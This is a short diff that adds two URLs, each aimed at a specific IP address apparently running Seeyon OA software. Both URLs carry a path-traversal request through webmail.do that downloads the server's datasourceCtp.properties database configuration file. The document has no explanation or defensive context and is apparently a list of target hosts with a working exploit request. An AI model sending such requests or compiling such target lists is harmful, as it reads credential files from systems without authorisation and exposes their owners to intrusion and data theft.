@@ -1,0 +1,2 @@
+http://120.197.184.83:8089/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+http://183.62.200.106:8081/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
